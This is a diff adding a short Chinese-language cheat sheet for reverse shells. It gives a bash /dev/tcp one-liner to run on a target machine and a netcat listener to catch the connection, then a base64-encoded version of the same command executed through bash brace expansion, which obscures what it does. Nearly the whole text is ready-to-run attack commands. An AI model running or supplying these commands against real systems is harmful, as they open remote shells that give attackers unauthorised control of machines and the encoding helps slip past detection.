@@ -1,0 +1,24 @@
+1、nc反弹
+在靶机在执行 ,xx.xx.xx是你本机的ip地址
+bash -i >& /dev/tcp/xx.xx.xx/8000  0>&1
+
+在本机上执行
+nc -lvnp 8000
+
+就可以收到反弹过来的shell了
+
+2、nc采用base64编码反弹
+
+首先把这个语句进行base64编码，192.168.1.1是本机的ip地址
+bash -i >& /dev/tcp/192.168.1.1/8000  0>&1
+
+编码后为
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMS84MDAwICAwPiYx
+
+在靶机执行
+bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMS84MDAwICAwPiYx}|{base64,-d}|{bash,-i}'
+
+接着在本机执行
+nc -lvnp 8000
+
+
